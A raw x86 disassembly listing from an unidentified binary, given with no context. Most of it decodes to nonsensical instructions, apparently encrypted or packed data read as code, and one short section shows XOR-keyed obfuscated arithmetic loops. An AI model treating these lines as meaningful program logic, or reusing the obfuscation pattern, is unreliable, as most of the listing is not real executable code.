  41ec27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec28:	pop    ds
  41ec29:	loope  0x41ebe2
  41ec2b:	(bad)  
  41ec2c:	in     eax,dx
  41ec2d:	shl    eax,0xce
  41ec30:	or     DWORD PTR [eax],eax
  41ec32:	movq   mm7,QWORD PTR [esi+0x30]
  41ec36:	es stos BYTE PTR es:[edi],al
  41ec38:	and    ebx,DWORD PTR [edi+0x60d68100]
  41ec3e:	sbb    BYTE PTR [ecx],dh
  41ec40:	add    eax,0x8eea3ed9
  41ec45:	dec    eax
  41ec46:	fld    QWORD PTR [ebx+0x30]
  41ec49:	xor    eax,0xbc6e7ec8
  41ec4e:	imul   ebp,esi,0x40fcf0d8
  41ec54:	ins    BYTE PTR es:[edi],dx
  41ec55:	cmp    edx,DWORD PTR [edi]
  41ec57:	cwde   
  41ec58:	pop    ebp
  41ec59:	aas    
  41ec5a:	daa    
  41ec5b:	add    BYTE PTR [ebp+0x533c7d8b],0xfa
  41ec62:	popa   
  41ec63:	js     0x41ec72
  41ec65:	cs jns 0x41ec5f
  41ec68:	add    eax,0x5da455e7
  41ec6d:	jp     0x41ec9d
  41ec6f:	push   ecx
  41ec70:	pop    edi
  41ec71:	xchg   esp,eax
  41ec72:	int    0xb0
  41ec74:	xchg   esp,eax
  41ec75:	xchg   ecx,eax
  41ec76:	aad    0x9a
  41ec78:	lahf   
  41ec79:	pop    edi
  41ec7a:	add    edx,ebp
  41ec7c:	dec    ecx
  41ec7d:	mov    dl,0x56
  41ec7f:	fdivr  QWORD PTR [edi]
  41ec81:	inc    edi
  41ec82:	sbb    BYTE PTR [esi-0x3f720f82],cl
  41ec88:	mov    cl,0x55
  41ec8a:	hlt    
  41ec8b:	ins    BYTE PTR es:[edi],dx
  41ec8c:	add    eax,0xac57e3cb
  41ec91:	arpl   WORD PTR [esi-0x32cc65c9],di
  41ec97:	pop    ecx
  41ec98:	pop    esp
  41ec99:	ret    
  41ec9a:	or     DWORD PTR [eax+0x27],edx
  41ec9d:	inc    eax
  41ec9e:	dec    BYTE PTR [esi+0x2cdd31de]
  41eca4:	ins    DWORD PTR es:[edi],dx
  41eca5:	adc    ebx,DWORD PTR ds:0x1719b7fd
  41ecab:	leave  
  41ecac:	arpl   WORD PTR [eax+0x691ddde8],bx
  41ecb2:	pop    edx
  41ecb3:	icebp  
  41ecb4:	je     0x41ed1c
  41ecb6:	lods   eax,DWORD PTR ds:[esi]
  41ecb7:	pop    ecx
  41ecb8:	shr    DWORD PTR [eax],cl
  41ecba:	xchg   esi,eax
  41ecbb:	push   ecx
  41ecbc:	adc    bl,0x2b
  41ecbf:	mov    cl,0x5e
  41ecc1:	sti    
  41ecc2:	mov    bl,0xc4
  41ecc4:	mov    ebp,0xaf4d57c
  41ecc9:	(bad)  
  41ecca:	repnz xlat BYTE PTR ds:[ebx]
  41eccc:	add    edi,DWORD PTR [esi+0x6e5c4bc2]
  41ecd2:	(bad)  
  41ecd3:	mov    bh,0xfc
  41ecd5:	push   0xc51b8f73
  41ecda:	div    bl
  41ecdc:	lea    ecx,[eax+0xd]
  41ecdf:	push   esp
  41ece0:	ds daa 
  41ece2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ece3:	and    BYTE PTR [ebx+ebx*1+0x719e62f2],al
  41ecea:	mov    esp,0x696cc8b5
  41ecf0:	push   es
  41ecf1:	xchg   esi,eax
  41ecf2:	jmp    0x6967:0xee054288
  41ecf9:	les    esi,FWORD PTR [ebx]
  41ecfb:	test   DWORD PTR [edx+0x704a8025],eax
  41ed01:	cmp    al,0x4b
  41ed03:	popf   
  41ed04:	sub    al,0x2d
  41ed06:	dec    ecx
  41ed07:	mov    dl,0xa2
  41ed09:	into   
  41ed0a:	push   esp
  41ed0b:	lock push ds
  41ed0d:	js     0x41ed4f
  41ed0f:	test   eax,0xf75c06e0
  41ed14:	sar    BYTE PTR [esi+0x21],cl
  41ed17:	mov    DWORD PTR [ecx],0x9b170988
  41ed1d:	and    DWORD PTR [ebx],ebp
  41ed1f:	adc    ebp,DWORD PTR [edi-0x7d]
  41ed22:	jp     0x41ed08
  41ed24:	into   
  41ed25:	out    dx,eax
  41ed26:	out    0x40,al
  41ed28:	pop    eax
  41ed29:	push   eax
  41ed2a:	jae    0x41ed02
  41ed2c:	adc    BYTE PTR [ecx],bh
  41ed2e:	push   edi
  41ed2f:	jo     0x41ed4d
  41ed31:	pop    ebp
  41ed32:	ret    0x8beb
  41ed35:	hlt    
  41ed36:	adc    ecx,DWORD PTR [edx+0x29b5e250]
  41ed3c:	ror    BYTE PTR [esi+0x41de0019],0x22
  41ed43:	xchg   edi,eax
  41ed44:	imul   esi,DWORD PTR [edx+0x55]
  41ed48:	jge    0x41eccd
  41ed4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed4b:	pop    ebp
  41ed4c:	dec    ecx
  41ed4d:	dec    edi
  41ed4e:	jmp    0x621d8f1e
  41ed53:	xchg   ebp,eax
  41ed54:	into   
  41ed55:	scas   eax,DWORD PTR es:[edi]
  41ed56:	sub    al,0xe4
  41ed58:	and    BYTE PTR [eax+0x16a06f76],ah
  41ed5e:	jp     0x41edc8
  41ed60:	sbb    DWORD PTR gs:[ecx+0x75],ebp
  41ed64:	test   al,0x41
  41ed66:	push   0x3b0ba156
  41ed6b:	call   0xea9f:0xa1b110f5
  41ed72:	(bad)  
  41ed73:	sbb    dh,BYTE PTR ds:0x51b08f24
  41ed79:	int3   
  41ed7a:	or     al,0x1
  41ed7c:	test   BYTE PTR [eax],ah
  41ed7e:	and    DWORD PTR [ecx+0x44],esi
  41ed81:	add    ch,BYTE PTR [ebp-0x21c96512]
  41ed87:	mov    esp,0x5868807f
  41ed8c:	stc    
  41ed8d:	xchg   DWORD PTR [ebx-0x77],edi
  41ed90:	fcomp  QWORD PTR [edx+0x6025306a]
  41ed96:	mov    esi,0xdecc9655
  41ed9b:	jge    0x41ee1b
  41ed9d:	mov    esi,0xe99b2dee
  41eda2:	xchg   edx,eax
  41eda3:	pusha  
  41eda4:	enter  0xa65a,0x59
  41eda8:	pop    edi
  41eda9:	pop    edx
  41edaa:	retf   
  41edab:	(bad)  
  41edad:	inc    edx
  41edae:	sbb    ebp,DWORD PTR ds:0x76b5afc6
  41edb4:	(bad)  
  41edb7:	(bad)  
  41edb8:	jns    0x41ee14
  41edba:	fistp  QWORD PTR [eax+0x516fb1b0]
  41edc0:	sti    
  41edc1:	push   esi
  41edc2:	jo     0x41ede4
  41edc4:	mov    al,0xe5
  41edc6:	hlt    
  41edc7:	fnstenv [edx+0x38]
  41edca:	test   al,0x67
  41edcc:	sar    DWORD PTR [eax],0xe9
  41edcf:	mov    esp,0xefed8ba4
  41edd4:	loopne 0x41edcb
  41edd6:	gs clc 
  41edd8:	sar    DWORD PTR [ecx],0xa
  41eddb:	ins    BYTE PTR es:[edi],dx
  41eddc:	pop    ecx
  41eddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edde:	push   edi
  41eddf:	mov    ?,WORD PTR [eax+eiz*8+0x2c]
  41ede3:	(bad)  
  41ede4:	dec    esi
  41ede5:	repz jns 0x41edaa
  41ede8:	(bad)  
  41ede9:	push   ds
  41edea:	add    BYTE PTR [ecx],bl
  41edec:	ficomp WORD PTR [ebx+0x35a1840f]
  41edf2:	loop   0x41ee21
  41edf4:	pop    esp
  41edf5:	scas   al,BYTE PTR es:[edi]
  41edf6:	in     al,0x36
  41edf8:	fist   WORD PTR [ebx+0x438b31a1]
  41edfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edff:	div    BYTE PTR [esi+edx*4+0xe]
  41ee03:	push   ss
  41ee04:	dec    ebp
  41ee05:	repz pop esi
  41ee07:	push   edi
  41ee08:	mov    eax,DWORD PTR [ebp-0x27]
  41ee0b:	(bad)  
  41ee0c:	mov    dl,BYTE PTR [edi-0x16456358]
  41ee12:	mov    DWORD PTR [edx],0x9864381
  41ee18:	int3   
  41ee19:	fmul   QWORD PTR [ecx+esi*4-0x64871ca8]
  41ee20:	out    0x4a,al
  41ee22:	mov    dl,0x36
  41ee24:	dec    esi
  41ee25:	xchg   ebx,eax
  41ee26:	cld    
  41ee27:	fwait
  41ee28:	scas   al,BYTE PTR es:[edi]
  41ee29:	and    ah,BYTE PTR [eax+ebx*2]
  41ee2c:	push   ecx
  41ee2d:	popf   
  41ee2e:	dec    edi
  41ee2f:	dec    ebp
  41ee30:	push   0xd6dad559
  41ee35:	das    
  41ee36:	loopne 0x41ee7a
  41ee38:	repnz clc 
  41ee3a:	mov    edi,ebp
  41ee3c:	(bad)  
  41ee3d:	ror    BYTE PTR [ecx+0x26],cl
  41ee40:	mov    ds:0x1dd2ee46,al
  41ee45:	retf   0x99ff
  41ee48:	pusha  
  41ee49:	mov    dl,0xf3
  41ee4b:	pop    es
  41ee4c:	jle    0x41edf6
  41ee4e:	mov    edx,DWORD PTR [ebp*2+0xa674ab9]
  41ee55:	or     DWORD PTR [ecx],esp
  41ee57:	mov    ch,0x50
  41ee59:	and    eax,0x6dfa8d3
  41ee5e:	jp     0x41ee16
  41ee60:	out    0xed,al
  41ee62:	sbb    BYTE PTR [esi-0x61e9d47d],bh
  41ee68:	data16 fstp QWORD PTR [edx]
  41ee6b:	push   ss
  41ee6c:	mov    WORD PTR [ebp+ebp*4+0x58],?
  41ee70:	adc    BYTE PTR [edx-0x3638957e],bl
  41ee76:	out    dx,al
  41ee77:	push   edi
  41ee78:	adc    al,0x54
  41ee7a:	push   edi
  41ee7b:	push   0x28
  41ee7d:	sbb    DWORD PTR ds:0xdf067f6b,esi
  41ee83:	leave  
  41ee84:	scas   eax,DWORD PTR es:[edi]
  41ee85:	dec    edx
  41ee86:	xchg   ebx,eax
  41ee87:	mov    DWORD PTR [edx-0x6239fa42],ecx
  41ee8d:	lods   eax,DWORD PTR ds:[esi]
  41ee8e:	stc    
  41ee8f:	inc    eax
  41ee90:	add    DWORD PTR [ecx],ebp
  41ee92:	or     WORD PTR [ecx+0x21c7194a],di
  41ee99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee9a:	dec    ebp
  41ee9b:	pop    esp
  41ee9c:	sub    BYTE PTR [edi-0x23],bl
  41ee9f:	pop    ebx
  41eea0:	or     dl,BYTE PTR [esi]
  41eea2:	push   ebx
  41eea3:	xchg   edi,eax
  41eea4:	out    0xe3,eax
  41eea6:	jae    0x41eed7
  41eea8:	fwait
  41eea9:	add    DWORD PTR [edi+0x42],0xfffffffd
  41eead:	fcom   DWORD PTR [eax]
  41eeaf:	jle    0x41ee84
  41eeb1:	out    dx,al
  41eeb2:	std    
  41eeb3:	add    dl,BYTE PTR [esi+0x52]
  41eeb6:	inc    DWORD PTR [ebx]
  41eeb8:	mov    esp,0x265d778b
  41eebd:	loop   0x41ee4c
  41eebf:	int    0x53
  41eec1:	enter  0x8614,0x69
  41eec5:	sub    BYTE PTR [ecx+0x12],bh
  41eec8:	stc    
  41eec9:	push   cs
  41eeca:	mov    ebp,0xa94ea21f
  41eecf:	mov    bh,0x8c
  41eed1:	mov    edx,0xc564834d
  41eed6:	out    dx,al
  41eed7:	aad    0x45
  41eed9:	cmp    BYTE PTR [edx],al
  41eedb:	ret    0xfbff
  41eede:	stc    
  41eedf:	jo     0x41ef28
  41eee1:	cmp    BYTE PTR [ebx+0x24970930],ah
  41eee7:	mov    cl,BYTE PTR [ecx-0x78417107]
  41eeed:	push   esi
  41eeee:	fistp  WORD PTR [eax-0x7b]
  41eef1:	xchg   DWORD PTR [ecx*8+0x7fd026bf],esi
  41eef8:	test   cl,dl
  41eefa:	jg     0x41ef2f
  41eefc:	jns    0x41ee9a
  41eefe:	push   edi
  41eeff:	add    esi,DWORD PTR [edx+0x3d]
  41ef02:	mov    es,ecx
  41ef04:	or     BYTE PTR [esi+0x79],0x89
  41ef08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef09:	sbb    edx,ebx
  41ef0b:	fstp   QWORD PTR [ecx]
  41ef0d:	pop    ebp
  41ef0e:	call   esp
  41ef10:	xlat   BYTE PTR ds:[ebx]
  41ef11:	sbb    dl,BYTE PTR [eax+ebp*8+0x5022d46e]
  41ef18:	jo     0x41ef2a
  41ef1a:	int3   
  41ef1b:	enter  0xffca,0x9a
  41ef1f:	loopne 0x41eec1
  41ef21:	in     al,0xc2
  41ef23:	test   eax,0x5a20ff0
  41ef28:	xchg   esi,eax
  41ef29:	jge    0x41ef65
  41ef2b:	inc    edx
  41ef2c:	ret    
  41ef2d:	mov    al,ds:0xb84ee930
  41ef32:	xor    al,0xc6
  41ef34:	test   DWORD PTR ds:[ebp-0x6db17f97],ecx
  41ef3b:	inc    ebp
  41ef3c:	jmp    0x41eef7
  41ef3e:	xchg   edx,eax
  41ef3f:	not    BYTE PTR [ecx+edi*2]
  41ef42:	push   esi
  41ef43:	std    
  41ef44:	popf   
  41ef45:	mov    ds:0x240af054,eax
  41ef4a:	stc    
  41ef4b:	or     ecx,DWORD PTR [ecx-0x34]
  41ef4e:	loop   0x41ef0e
  41ef50:	mov    ebx,0x6b2c2e4b
  41ef55:	or     esi,DWORD PTR [edi+edx*2]
  41ef58:	nop
  41ef59:	rcl    al,0x5
  41ef5c:	std    
  41ef5d:	mov    ecx,0xbc308d10
  41ef62:	mov    al,ds:0x4342d445
  41ef67:	push   esi
  41ef68:	fcmove st,st(2)
  41ef6a:	adc    esp,ebx
  41ef6c:	leave  
  41ef6d:	daa    
  41ef6e:	out    dx,al
  41ef6f:	and    cl,BYTE PTR [esi-0x2c]
  41ef72:	jns    0x41ef53
  41ef74:	shl    DWORD PTR [eax+0x585b61c7],cl
  41ef7a:	es pop ebx
  41ef7c:	inc    ecx
  41ef7d:	outs   dx,DWORD PTR ds:[esi]
  41ef7e:	inc    esi
  41ef7f:	out    0xf3,al
  41ef81:	xchg   DWORD PTR [esi+0x39],ebx
  41ef84:	sub    eax,0x5037f09f
  41ef89:	cwde   
  41ef8a:	mov    ds:0xf3d8ff60,al
  41ef8f:	cmc    
  41ef90:	retf   
  41ef91:	ja     0x41ef4b
  41ef93:	and    ebp,DWORD PTR ds:0xd319fb1f
  41ef99:	push   ebx
  41ef9a:	push   ebx
  41ef9b:	xchg   ebp,eax
  41ef9c:	mov    dh,0x57
  41ef9e:	out    dx,al
  41ef9f:	sti    
  41efa0:	arpl   WORD PTR ds:0x9499a69d,di
  41efa6:	or     eax,0xc9bbf1ed
  41efab:	ds adc al,0xf9
  41efae:	sub    BYTE PTR [edx+0x1d],dl
  41efb1:	mov    eax,0xd592da5f
  41efb6:	cmp    DWORD PTR [ebx],eax
  41efb8:	sbb    DWORD PTR [edi],ebx
  41efba:	leave  
  41efbb:	or     eax,0xf347d6ac
  41efc0:	out    0xaa,eax
  41efc2:	pop    ecx
  41efc3:	fimul  WORD PTR [esi-0x41]
  41efc6:	icebp  
  41efc7:	ds push 0x7ddeb35d
  41efcd:	ss (bad) 
  41efcf:	out    0x67,al
  41efd1:	add    edx,DWORD PTR [ebx+0x71]
  41efd4:	push   ecx
  41efd5:	dec    ebx
  41efd6:	daa    
  41efd7:	lds    ebp,FWORD PTR [esi+0x4ae7c5a8]
  41efdd:	push   edi
  41efde:	leave  
  41efdf:	jo     0x41ef89
  41efe1:	popa   
  41efe2:	and    esi,DWORD PTR [eax+0x45]
  41efe5:	sahf   
  41efe6:	out    dx,al
  41efe7:	mov    ah,BYTE PTR [eax+0x1ac2cf01]
  41efed:	call   DWORD PTR [ebp+0x17]
  41eff0:	push   cs
  41eff1:	add    DWORD PTR [eax+esi*8],eax
  41eff4:	dec    edi
  41eff5:	int3   
  41eff6:	add    dh,al
  41eff8:	out    0xd7,al
  41effa:	call   0x3c8:0x33800f53
  41f001:	into   
  41f002:	jne    0x41cc6b
  41f008:	mov    ecx,DWORD PTR [ebp-0xc]
  41f00b:	mov    DWORD PTR [ebp+0x8],ecx
  41f00e:	jmp    0x41f040
  41f013:	mov    ecx,DWORD PTR [ebp+0x8]
  41f016:	mov    edx,DWORD PTR [ebp-0x8]
  41f019:	xor    ecx,eax
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x5b2a6403
  41f0bf:	mov    cl,0x1e
  41f0c1:	push   ecx
  41f0c2:	fsub   DWORD PTR [ecx+0x62]
  41f0c5:	cmp    al,0x5f
  41f0c7:	bound  esp,QWORD PTR [edx+0x5e]
  41f0ca:	sub    ebx,esp
  41f0cc:	push   0xd51769f2
  41f0d1:	xchg   ebx,eax
  41f0d2:	xor    DWORD PTR [ebp+0xafbfc93],0xffffffc9
  41f0d9:	xor    al,0x9
  41f0db:	(bad)  
  41f0dc:	retf   0x5474
  41f0df:	xchg   ebx,eax
  41f0e0:	rol    BYTE PTR [ecx+0x399c5938],1
  41f0e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0e7:	pop    eax
  41f0e8:	mov    ah,0x7b
  41f0ea:	mov    dl,0xc
  41f0ec:	repnz jmp 0xc02d:0x6946bbc
  41f0f4:	xchg   esp,eax
  41f0f5:	pop    ecx
  41f0f6:	and    DWORD PTR [esi-0x5be1dad],edx
  41f0fc:	or     ecx,esi
  41f0fe:	sbb    eax,0x45b99e3
  41f103:	faddp  st(0),st
  41f105:	add    DWORD PTR [eax+0x17],ecx
  41f108:	mov    dl,0x14
  41f10a:	xchg   esi,eax
  41f10b:	icebp  
  41f10c:	mov    eax,ds:0x6d3dcd86
  41f111:	stos   DWORD PTR es:[edi],eax
  41f112:	ds inc esp
  41f114:	das    
  41f115:	(bad)  
  41f116:	or     bh,BYTE PTR [ebp+0x2a]
  41f119:	aam    0x40
  41f11b:	mov    edx,DWORD PTR [esi-0x22]
  41f11e:	sahf   
  41f11f:	std    
  41f120:	(bad)  
  41f121:	cld    
  41f122:	iret   
  41f123:	or     eax,DWORD PTR ds:0xc2a0f7a8
  41f129:	xor    al,0x63
  41f12b:	loop   0x41f0ea
  41f12d:	adc    DWORD PTR [esi+0x10],eax
  41f130:	aad    0x18
  41f132:	arpl   WORD PTR [esi-0x797b5b0e],cx
  41f138:	retf   
  41f139:	es nop
  41f13b:	pop    ds
  41f13c:	or     esp,DWORD PTR [ebx-0xf]
  41f13f:	push   esi
  41f140:	add    al,0xc4
  41f142:	dec    ebx
  41f143:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f144:	inc    esi
  41f145:	hlt    
  41f146:	xchg   BYTE PTR [ebp+0x3],bh
  41f149:	sub    DWORD PTR [edi+0x48b6e0c],esi
  41f14f:	and    BYTE PTR [eax+0x6b8fa576],bh
  41f155:	test   al,0x8f
  41f157:	xor    eax,0xb7a1f7df
  41f15c:	aam    0x8e
  41f15e:	xchg   edi,eax
  41f15f:	outs   dx,BYTE PTR ds:[esi]
  41f160:	int3   
  41f161:	dec    eax
  41f162:	pop    ds
  41f163:	mov    ds:0x55cf6c80,al
  41f168:	jb     0x41f16c
  41f16a:	mov    eax,0x84e6d869
  41f16f:	jp     0x41f1e6
  41f171:	xchg   edi,eax
  41f172:	lea    esp,[eax]
  41f174:	mov    al,0x7b
  41f176:	push   esi
  41f177:	xchg   ecx,eax
  41f178:	or     BYTE PTR ds:0xee5b5ae5,ch
  41f17e:	adc    BYTE PTR [esi+ecx*1-0x2d],cl
  41f182:	cs pop ebp
  41f184:	pop    ds
  41f185:	xor    al,0x50
  41f187:	retf   0x3960
  41f18a:	jmp    ebx
  41f18c:	mov    ah,0x27
  41f18e:	es icebp 
  41f190:	inc    ecx
  41f191:	scas   eax,DWORD PTR es:[edi]
  41f192:	sub    ah,BYTE PTR [edx-0x5477bba]
  41f198:	ja     0x41f179
  41f19a:	lock lods al,BYTE PTR ds:[esi]
  41f19c:	sti    
  41f19d:	loopne 0x41f1d4
  41f19f:	push   0x629323d6
  41f1a4:	push   esi
  41f1a5:	mov    eax,esi
  41f1a7:	jge    0x41f161
  41f1a9:	mov    cl,0xb
  41f1ab:	es push edx
  41f1ad:	push   ds
  41f1ae:	imul   edi,DWORD PTR es:[ebx+0x50512644],0x5efcd13f
  41f1b9:	mov    ecx,0xf924db42
  41f1be:	sub    edi,DWORD PTR [eax]
  41f1c0:	mov    eax,0x1c0d3211
  41f1c5:	mov    eax,ds:0x6a9a41e1
  41f1ca:	adc    dh,BYTE PTR [eax+0x7]
  41f1cd:	inc    eax
  41f1ce:	call   0x1f8eea37
  41f1d3:	mov    ecx,0xbf80ab82
  41f1d8:	mov    eax,0xcc7f6b50
  41f1dd:	or     al,0x80
  41f1df:	mov    ah,0x4f
  41f1e1:	(bad)  
  41f1e2:	es xchg esi,eax
  41f1e4:	hlt    
  41f1e5:	cmc    
  41f1e6:	jl     0x41f212
  41f1e8:	popa   
  41f1e9:	push   es
  41f1ea:	pop    ss
  41f1eb:	test   BYTE PTR es:[ebp+0x2a],al
  41f1ef:	nop
  41f1f0:	push   ds
  41f1f1:	(bad)  
  41f1f2:	mov    ah,0x42
  41f1f4:	sub    al,0xf2
  41f1f6:	jb     0x41f191
  41f1f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1f9:	(bad)  
  41f1fa:	pop    eax
  41f1fb:	cmp    DWORD PTR [edi],0x7c98ce72
  41f201:	cmp    ah,al
  41f203:	jo     0x41f24c
  41f205:	retf   
  41f206:	ds (bad) 
  41f208:	push   ds
  41f209:	inc    ebp
  41f20a:	repnz iret 
  41f20c:	lds    esp,FWORD PTR [eax-0x4a]
  41f20f:	jns    0x41f27d
  41f211:	xchg   edi,eax
  41f212:	fidiv  DWORD PTR [esi*8-0x1bff7a89]
  41f219:	out    dx,eax
  41f21a:	add    edx,DWORD PTR [edx+edx*8]
  41f21d:	mov    eax,ds:0xa869c446
  41f222:	fisub  DWORD PTR [esi+ebx*2]
  41f225:	add    ecx,DWORD PTR [eax]
  41f227:	jmp    DWORD PTR [edx+0x73]
  41f22a:	sbb    al,0x93
  41f22c:	(bad)  
  41f22d:	jg     0x41f286
  41f22f:	cmp    al,0x18
  41f231:	xchg   ebp,eax
  41f232:	ror    DWORD PTR [eax],0xfb
  41f235:	mov    dl,0xa
  41f237:	scas   al,BYTE PTR es:[edi]
  41f238:	xor    bh,bh
  41f23a:	inc    edx
  41f23b:	pushf  
  41f23c:	cmp    BYTE PTR [ebp-0x6f42788f],dh
  41f242:	pusha  
  41f243:	mov    dh,0xb0
  41f245:	mov    ecx,0xa6815c45
  41f24a:	popa   
  41f24b:	or     DWORD PTR [edi+0x5799b767],esi
  41f251:	test   eax,0x180ea28f
  41f256:	jl     0x41f1ef
  41f258:	mov    cl,BYTE PTR [edx+0x62]
  41f25b:	ds or  eax,0xba0b84ac
  41f261:	(bad)  
  41f262:	jg     0x41f2b5
  41f264:	(bad)  
  41f265:	jne    0x41f28d
  41f267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f268:	(bad)  
  41f26a:	out    0x93,al
  41f26c:	push   ds
  41f26d:	and    edx,DWORD PTR [ebp-0x29]
  41f270:	ror    DWORD PTR [esi-0x23],cl
  41f273:	sbb    edx,DWORD PTR ds:0xf2ca3fce
  41f279:	push   ss
  41f27a:	int3   
  41f27b:	es iret 
  41f27d:	and    BYTE PTR [esi+0x58193998],0x49
  41f284:	fnstenv [esi+ebp*8+0x39627234]
  41f28b:	and    BYTE PTR [edi-0x4b],dl
  41f28e:	jo     0x41f290
  41f290:	xchg   ebp,eax
  41f291:	pop    ss
  41f292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f293:	inc    eax
  41f294:	jp     0x41f257
  41f296:	(bad)  
  41f297:	dec    edi
  41f298:	loope  0x41f306
  41f29a:	push   ecx
  41f29b:	fwait
  41f29c:	hlt    
  41f29d:	or     ecx,eax
  41f29f:	xchg   ecx,eax
  41f2a0:	lods   al,BYTE PTR ds:[esi]
  41f2a1:	loop   0x41f296
  41f2a3:	stos   DWORD PTR es:[edi],eax
  41f2a4:	adc    cl,BYTE PTR [esi+0x55f3bf84]
  41f2aa:	jno    0x41f325
  41f2ac:	or     BYTE PTR [edi],al
  41f2ae:	xchg   ax,ax
  41f2b0:	pushf  
  41f2b1:	out    dx,al
  41f2b2:	imul   ecx,DWORD PTR [ecx-0x1],0x5
  41f2b6:	dec    eax
  41f2b7:	xchg   ebx,eax
  41f2b8:	push   edx
  41f2b9:	lea    ecx,[edx+0x25c779cb]
  41f2bf:	mov    ds:0x50be56a1,al
  41f2c4:	sbb    al,0xea
  41f2c6:	retf   0xfc21
  41f2c9:	xchg   BYTE PTR [edx-0x49],bl
  41f2cc:	or     eax,0x354d32cd
  41f2d1:	jno    0x41f303
  41f2d3:	inc    eax
  41f2d4:	test   eax,0xf2a6b291
  41f2d9:	es out 0x6f,eax
  41f2dc:	outs   dx,DWORD PTR ds:[esi]
  41f2dd:	mov    WORD PTR [eax+0x5d],ds
  41f2e0:	mov    bl,0xcd
  41f2e2:	leave  
  41f2e3:	and    eax,0x80d5c7bf
  41f2e8:	test   dh,bh
  41f2ea:	xor    esi,DWORD PTR [ebx]
  41f2ec:	sub    al,0x81
  41f2ee:	xchg   esi,eax
  41f2ef:	retf   
  41f2f0:	lea    eax,[ebx-0x685b5dd4]
  41f2f6:	fidiv  WORD PTR [esi]
  41f2f8:	mov    ebp,DWORD PTR [esi-0x3d]
  41f2fb:	cmp    BYTE PTR [esi+0x4d],0x9
  41f2ff:	mov    esp,0x7d6c3459
  41f304:	cdq    
  41f305:	cs xor al,0x6b
  41f308:	dec    ebp
  41f309:	into   
  41f30a:	pop    ecx
  41f30b:	xlat   BYTE PTR ds:[ebx]
  41f30c:	jg     0x41f334
  41f30e:	cdq    
  41f30f:	sbb    eax,0xaa2f7629
  41f314:	add    al,0xa1
  41f316:	in     al,dx
  41f317:	sahf   
  41f318:	addr16 popf 
  41f31a:	sub    al,0xa8
  41f31c:	pop    esi
  41f31d:	mov    ebx,0x85b16594
  41f322:	xor    eax,DWORD PTR [esi-0x64218dca]
  41f328:	cdq    
  41f329:	(bad)  
  41f32b:	xor    bl,dl
  41f32d:	jge    0x41f33f
  41f32f:	into   
  41f330:	fs push ds
  41f332:	or     ebp,DWORD PTR [eax+0xeb94449]
  41f338:	xchg   esi,eax
  41f339:	sahf   
  41f33a:	xor    eax,0x5f
  41f33d:	dec    esi
  41f33e:	ins    BYTE PTR es:[edi],dx
  41f33f:	aas    
  41f340:	cs jp  0x41f3b8
  41f343:	xor    ah,BYTE PTR [esi+0x34]
  41f346:	fs push 0xffffffea
  41f349:	inc    esi
  41f34a:	pop    ebp
  41f34b:	test   DWORD PTR [ebx],0xe2ac1a0a
  41f351:	fild   QWORD PTR [edx]
  41f353:	into   
  41f354:	cmp    BYTE PTR ds:0x3246214d,bl
  41f35a:	add    al,0x64
  41f35c:	push   esi
  41f35d:	mov    ebx,0xe2c85287
  41f362:	mov    dh,0x9f
  41f364:	shl    BYTE PTR [esi-0x56],cl
  41f367:	sbb    bl,BYTE PTR ds:[ecx+0x75fb4223]
  41f36e:	pop    ebp
  41f36f:	imul   esi,esp,0x6dd79a9e
  41f375:	test   BYTE PTR [ebp+0x63499c3],bl
  41f37b:	push   es
  41f37c:	cmp    edx,edx
  41f37e:	nop
  41f37f:	arpl   WORD PTR [ebp+0x2a31b7f4],sp
